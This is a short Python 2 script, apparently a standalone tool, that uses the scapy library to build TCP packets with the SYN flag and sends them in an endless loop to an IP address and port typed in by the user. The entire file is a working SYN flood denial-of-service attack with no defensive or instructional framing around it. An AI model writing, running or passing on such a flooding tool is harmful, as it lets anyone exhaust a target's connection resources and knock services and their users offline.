import socket
import struct
from scapy.all import *

def syn_flood(dst_ip, dst_port):
	while True:
		ip_layer = IP(dst=dst_ip)
		tcp_layer = TCP(dport=dst_port, flags="S") # S -> SYN
		packet = ip_layer / tcp_layer
		send(packet)

dst_ip = raw_input("dst_ip: ")
dst_port = int(raw_input("dst_port: "))
print "syn_flood( " + dst_ip + ", " + str(dst_port) + " ) invoked."
syn_flood(dst_ip, dst_port)
